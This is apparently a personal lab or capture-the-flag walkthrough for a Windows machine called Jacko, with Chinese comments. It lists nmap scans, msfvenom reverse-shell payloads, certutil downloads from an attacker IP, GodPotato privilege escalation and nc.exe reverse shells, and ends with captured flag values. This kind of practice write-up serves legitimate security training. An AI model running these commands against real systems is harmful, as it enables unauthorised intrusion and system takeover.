# Win - Jacko

---

### Host

```bash
192.168.212.66
```

### Scan

```bash
// Quick scan.
> nmap -sV -T4 192.168.212.66

// Full TCP scan.
> nmap -sCV -A -Pn -O -p- 192.168.212.66 -oN tcpnmap.md

// Full UDP scan.
> sudo nmap -sU -Pn 192.168.212.66 --top-ports=100 --reason -oN udpnmap.md
```

---

## Walkthrough

![image.png](Win%20-%20Jacko%2018d553bebf0f806aa0dace43079ea26d/image.png)

![image.png](Win%20-%20Jacko%2018d553bebf0f806aa0dace43079ea26d/image%201.png)

![image.png](Win%20-%20Jacko%2018d553bebf0f806aa0dace43079ea26d/image%202.png)

![image.png](Win%20-%20Jacko%2018d553bebf0f806aa0dace43079ea26d/image%203.png)

![image.png](Win%20-%20Jacko%2018d553bebf0f806aa0dace43079ea26d/image%204.png)

![image.png](Win%20-%20Jacko%2018d553bebf0f806aa0dace43079ea26d/image%205.png)

![image.png](Win%20-%20Jacko%2018d553bebf0f806aa0dace43079ea26d/image%206.png)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.170 LPORT=6767 -f exe -o reverse.exe

// 确认shell放置路径

certutil -urlcache -f http://192.168.45.170/reverse.exe C:\Users\tony\reverse.exe

C:\\Users\\tony\\reverse.exe

// 检查PATH，有时候PATH变量缺少了C:\Windows\System32
echo %PATH%
// 手动修改pass
set PATH=%PATH%;C:\Windows\System32

certutil -urlcache -f http://192.168.45.170/PrintSpoofer64.exe C:\Users\tony\pf.exe

// 检查.NET版本 -> 选择合适的GodPotato
reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP" /s
certutil -urlcache -f http://192.168.45.170/GodPotatoNET4.exe C:\Users\tony\gp.exe

// 使用
C:\Users\Public\GodPotato-NET4.exe -cmd "cmd /c whoami"

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.170 LPORT=9090 -f exe -o newre.exe

certutil -urlcache -f http://192.168.45.170/nc.exe C:\Users\tony\nc.exe

GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.174 7777"
gp.exe -cmd "C:\Windows\Temp\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.170 9090"

certutil -urlcache -f http://192.168.45.170/nc.exe C:\Users\tony\nc.exe

gp.exe -cmd "C:\Users\tony\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.170 9090"

-> now admin on port 9090
```

https://www.exploit-db.com/exploits/49384

```bash
- local.txt : b4818f39e89e77a8e03a0692439d9c54
- proof.txt : c77d58a8209bda1a0bad49dbb25d66b7
```